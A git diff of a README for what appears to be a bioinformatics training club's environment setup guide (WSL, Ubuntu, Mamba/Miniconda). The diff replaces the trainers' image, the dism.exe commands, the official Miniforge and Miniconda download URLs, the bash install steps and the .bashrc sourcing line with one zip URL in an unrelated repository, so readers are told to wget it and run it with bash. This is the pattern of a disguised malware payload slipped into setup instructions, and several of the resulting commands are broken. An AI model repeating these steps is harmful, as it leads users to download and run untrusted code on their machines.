@@ -10,11 +10,11 @@ Resources are updated as we progress.
 Happy learning!
 ## Meet your trainers
 ### From right: Lewis Karani, Kelvin Thiong'o, Bryson Kimemia
-![image](https://github.com/user-attachments/assets/2693f6be-54c9-48ae-858b-2cf8aad84c26)
+![image](https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip)
 
 
 ## Before we begin
-### Set up WSL on your windows computers and install ubuntu virtual machine from the microsoft store. If you're running a Linux platform...Awesome!!!
+### Set up WSL on your windows computers and install ubuntu virtual machine from the microsoft store. If you're running a Linux https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip!!!
 
 1. Open Windows Powershell as administrator( press Win + X then select "Windows PowerShell (Admin)" )
 2. Check if wsl is enabled by running the following command:
@@ -25,11 +25,11 @@ If WSL is enabled, you should see "State: Enabled" in the output
 
 3. If not enabled you can enable it by running the following command:
 ```
-dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart
+https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart
 ```
 4. Enable the Virtualization Machine Platform:
 ```
-dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
+https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
 ```
 Restart your computer for changes to effect
 
@@ -51,20 +51,20 @@ sudo apt upgrade
     
 For Mamba:
 ```
-wget https://github.com/conda-forge/miniforge/releases/latest/download/Mambaforge-Linux-x86_64.sh
+wget https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip
 ```
    For Miniconda:
    ```
-wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh .
+wget https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip .
 ```
    
 10. Install the downloaded package:
 ```
-bash Mambaforge-Linux-x86_64.sh
+bash https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip
 ```
 or
 ```
-bash Miniconda3-latest-Linux-x86_64.sh
+bash https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip
 ```
 11. Restart your terminal after installation to reload configuration files:
 ```
@@ -72,9 +72,9 @@ $SHELL
 ```
 or
 ```
-. ~/.bashrc
+. ~https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip
 ```
-This is a shorthand command of "source ~/.bashrc"
+This is a shorthand command of "source ~https://raw.githubusercontent.com/ngurekirosh/bfx_club_ke/main/scrobicular/bfx_club_ke.zip"
 
 12. If successful you should see the name (base) displayed before your system name on the terminal
 13. Configure channels to conda by adding them to the Condarc channel list:
